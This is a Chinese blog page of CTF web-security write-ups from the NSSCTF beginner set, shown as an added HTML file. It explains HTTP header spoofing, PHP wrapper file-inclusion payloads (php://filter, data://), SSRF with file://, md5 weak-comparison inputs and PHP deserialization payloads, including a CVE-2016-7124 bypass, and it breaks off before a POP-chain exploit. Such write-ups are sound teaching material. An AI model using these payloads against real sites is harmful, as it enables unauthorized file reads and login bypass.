@@ -1,0 +1,998 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgsfavicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><link rel="mask-icon" href="/%5Bobject%20Object%5D?v=2.6.2" color="#54bcff"><meta name="description" content="[SWPUCTF 2021 新生赛]jicao       12345678&lt;?php    highlight_file(&amp;#x27;index.php&amp;#x27;);include(&quot;flag.php&quot;);$id&#x3D;$_POST[&amp;#x27;id&amp;#x27;];$json&#x3D;json_decode($_GET[&amp;#x27;json&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF-Web安全入门刷题">
+<meta property="og:url" content="http://pig-007.github.io/2023/03/09/NSSCTF-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/index.html">
+<meta property="og:site_name" content="PIG-007">
+<meta property="og:description" content="[SWPUCTF 2021 新生赛]jicao       12345678&lt;?php    highlight_file(&amp;#x27;index.php&amp;#x27;);include(&quot;flag.php&quot;);$id&#x3D;$_POST[&amp;#x27;id&amp;#x27;];$json&#x3D;json_decode($_GET[&amp;#x27;json&amp;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120854983.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120925542.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121003165.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121230587.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121237694.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107145303596.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107153916700.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107154534824.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155030276.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155126859.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155613921.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155718000.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160859666.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160953981.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161034318.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161117359.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161156905.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161205486.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161327121.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163522282.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163611667.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163829405.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163903762.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107164119474.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165705357.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165729931.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165833572.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170206722.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170914355.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107174901023.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108113757842.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108114004672.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120158522.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120354823.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108120814927.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121124426.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121600420.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121739396.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121804523.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121855956.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108121939989.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230108122127917.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109200923250.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201242190.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201720863.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201814743.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109201940275.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205721004.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205707061.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109205850748.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210209173.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230109210301490.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110140811427.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141330808.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110141934420.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110142057595.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173717231.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173850560.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175556882.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110173359149.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110175654372.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180052010.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180123723.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180254544.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110180737312.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181009012.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181442257.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110181822291.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230110182041851.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111154621041.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164052011.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164116060.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164320942.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111164515198.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111165045717.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111171930724.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230111174624907.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155550917.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155613805.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155641182.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112155719927.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112161329622.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162026870.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162115798.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112162739395.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112163519711.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164326132.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112164500524.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112165239719.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230112170040620.png">
+<meta property="article:published_time" content="2023-03-09T02:25:33.000Z">
+<meta property="article:modified_time" content="2023-09-11T13:12:25.613Z">
+<meta property="article:author" content="PIG-007">
+<meta property="article:tag" content="NSSCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120854983.png"><title>NSSCTF-Web安全入门刷题 | PIG-007</title><link ref="canonical" href="http://pig-007.github.io/2023/03/09/NSSCTF-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":true},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.4.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">Search</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">PIG-007</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">NSSCTF-Web安全入门刷题</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-03-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body">
+        <h1 id="SWPUCTF-2021-新生赛-jicao"   >
+          <a href="#SWPUCTF-2021-新生赛-jicao" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h1>
+      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=json_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>传入两个参数即可</p>
+
+        <h1 id="SWPUCTF-2021-新生赛-Do-you-know-http"   >
+          <a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h1>
+      <p>访问如下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120854983.png" alt="image-20230107120854983"></p>
+<p>浏览器不对，那么首先需要修改<code>User-Agent</code>为<code>WLLM</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120925542.png" alt="image-20230107120925542"></p>
+<p>跟随重定向后跳转到<code>a.php</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121003165.png" alt="image-20230107121003165"></p>
+<p>发现来源<code>IP</code>不对，那么需要修改<code>X-Forwarded-For</code>字段</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121230587.png" alt="image-20230107121230587"></p>
+<p>跟随重定向后得到最终<code>flag</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121237694.png" alt="image-20230107121237694"></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-gift-F12"   >
+          <a href="#SWPUCTF-2021-新生赛-gift-F12" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h1>
+      <p>确实如名字，<code>F12</code>在元素资源中可以找到</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107145303596.png" alt="image-20230107145303596"></p>
+
+        <h1 id="第五空间-2021-WebFTP"   >
+          <a href="#第五空间-2021-WebFTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a>[第五空间 2021]WebFTP</h1>
+      <p><code>dirsearch</code>扫描之后，在<code>readm.txt</code>中找到对应的超级管理员账号密码<code>admin/admin888</code></p>
+<p>登录进去之后，在<code>phpinfo.php</code>中找到<code>flag</code>，或者不用登录，直接<code>/phpinfo.php</code>就能找到，应该是所谓非预期，下面看看预期解</p>
+<p>同样该<code>WebFTP</code>是<code>github</code>上一个老框架，可以在<code>/Readme/mytz.php</code>中存在敏感信息泄露漏洞</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107153916700.png" alt="image-20230107153916700"></p>
+<p>或者<code>seay</code>好像可以审计出来</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107154534824.png" alt="image-20230107154534824"></p>
+<p>对应泄露为<code>/Readme/mytz.php?act=phpinfo</code></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-easy-md5"   >
+          <a href="#SWPUCTF-2021-新生赛-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h1>
+      <p><code>md5</code>弱比较</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155030276.png" alt="image-20230107155030276"></p>
+<p>使用<code>QNKCDZO</code>和<code>s214587387a</code>即可</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155126859.png" alt="image-20230107155126859"></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-include"   >
+          <a href="#SWPUCTF-2021-新生赛-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h1>
+      <p>提示传入<code>file</code>参数，然后得到源码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155613921.png" alt="image-20230107155613921"></p>
+<p>由于最后会使用<code>include_once</code>将对应<code>file</code>包含进来，那么可以使用相关的<code>php</code>伪协议</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>
+
+<p><code>base64</code>解码后得到<code>flag</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155718000.png" alt="image-20230107155718000"></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-PseudoProtocols"   >
+          <a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160859666.png" alt="image-20230107160859666"></p>
+<p>首先看到提示，并且<code>URL</code>中为<code>/...?wllm=...</code>，很明显就是想让我们填一个东西，试试<code>hint.php</code>填入</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160953981.png" alt="image-20230107160953981"></p>
+<p>啥也没有，那么尝试用一下<code>php</code>伪协议</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28530/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161034318.png" alt="image-20230107161034318"></p>
+<p>可以看到出来了，<code>base64</code>解一下查看内容</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161117359.png" alt="image-20230107161117359"></p>
+<p>让我们访问<code>/test2222222222222.php</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161156905.png" alt="image-20230107161156905"></p>
+<p>主要关注如下，需要设置<code>a</code>，然后其内容为<code>I want flag</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161205486.png" alt="image-20230107161205486"></p>
+<p>由于用的是<code>file_get_contents</code>函数，那么可以使用<code>data</code>数据流</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test2222222222222.php?a=data://text/plain,I%20want%20flag</span><br></pre></td></tr></table></div></figure>
+
+<p>得到<code>flag</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161327121.png" alt="image-20230107161327121"></p>
+
+        <h1 id="NISACTF-2022-easyssrf"   >
+          <a href="#NISACTF-2022-easyssrf" class="heading-link"><i class="fas fa-link"></i></a><a href="#NISACTF-2022-easyssrf" class="headerlink" title="[NISACTF 2022]easyssrf"></a>[NISACTF 2022]easyssrf</h1>
+      <p>访问之后提示<code>SSRF</code></p>
+<p>那么访问一下本地网站下面的<code>index.php</code>，不太行，那试试<code>flag.php</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163522282.png" alt="image-20230107163522282"></p>
+<p>再试试<code>/fl4g</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163611667.png" alt="image-20230107163611667"></p>
+<p>不太行，试试<code>file</code>协议</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163829405.png" alt="image-20230107163829405"></p>
+<p>访问一下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107163903762.png" alt="image-20230107163903762"></p>
+<p>输出<code>file</code>，这里不用管那个判断，没啥用，只要<code>file</code>里面不包含<code>file</code>字符串就行，那么直接<code>/flag</code>就能得到</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107164119474.png" alt="image-20230107164119474"></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-ez-unserialize"   >
+          <a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-ez-unserialize" class="headerlink" title="[SWPUCTF 2021 新生赛]ez_unserialize"></a>[SWPUCTF 2021 新生赛]ez_unserialize</h1>
+      <p>访问啥也没有，<code>dirsearch</code>一下，发现<code>robots.txt</code>，访问一下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165705357.png" alt="image-20230107165705357"></p>
+<p>接着访问<code>/cl45s.php</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165729931.png" alt="image-20230107165729931"></p>
+<p>可以看到反序列化设置一下对应属性即可</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28869/cl45s.php?p=O:4:%22wllm%22:2:&#123;s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:3:%22ctf%22;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107165833572.png" alt="image-20230107165833572"></p>
+
+        <h1 id="SWPUCTF-2021-新生赛-no-wakeup"   >
+          <a href="#SWPUCTF-2021-新生赛-no-wakeup" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-no-wakeup" class="headerlink" title="[SWPUCTF 2021 新生赛]no_wakeup"></a>[SWPUCTF 2021 新生赛]no_wakeup</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170206722.png" alt="image-20230107170206722"></p>
+<p>尝试用<code>CVE-2016-7124</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28150/class.php?p=O:6:%22HaHaHa%22:3:&#123;s:5:%22admin%22;s:5:%22admin%22;s:6:%22passwd%22;s:4:%22wllm%22;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p>成功</p>
+
+        <h1 id="ZJCTF-2019-NiZhuanSiWei"   >
+          <a href="#ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h1>
+      <p>写过，首先用<code>data</code>流和<code>php</code>伪协议读取<code>useless.php</code></p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=useless.php&amp;text=data://text/plain,welcome%20to%20the%20zjctf</span><br></pre></td></tr></table></div></figure>
+
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107170914355.png" alt="image-20230107170914355"></p>
+<p>然后借助<code>tostring</code>方法，将<code>Flag-&gt;file</code>设置为<code>flag</code>即可，通过反序化打印出来</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=useless.php&amp;text=data://text/plain,welcome%20to%20the%20zjctf&amp;password=O:4:%22Flag%22:1:&#123;s:4:%22file%22;s:8:%22flag.php%22;&#125;</span><br></pre></td></tr></table></div></figure>
+
+<p><code>flag</code>在注释中</p>
+
+        <h1 id="SWPUCTF-2021-新生赛-pop"   >
+          <a href="#SWPUCTF-2021-新生赛-pop" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-pop" class="headerlink" title="[SWPUCTF 2021 新生赛]pop"></a>[SWPUCTF 2021 新生赛]pop</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107174901023.png" alt="image-20230107174901023"></p>
+<p>访问之后，可以看到考<code>pop</code>链，这里即为</p>
+<figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">w22m-&gt;__destruct()&#123;<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;w00m;&#125;</span><br><span class="line"><span class="comment">//设置成员$this-&gt;w00m为w33m类,进而调用到w33m-&gt;__toString</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">w33m-&gt;__toString()&#123;<span class="keyword">$this</span>-&gt;w00m-&gt;&#123;<span class="keyword">$this</span>-&gt;w22m&#125;();&#125;</span><br><span class="line"><span class="comment">//设置成员$this-&gt;w00m为w44m类,$this-&gt;w22m为&quot;Getflag&quot;</span></span><br><span class="line"><span class="comment">//进而调用到w44m-&gt;Getflag()函数</span></span><br></pre></td></tr></table></div></figure>
+
+<p>得到如下<code>exp</code></p>
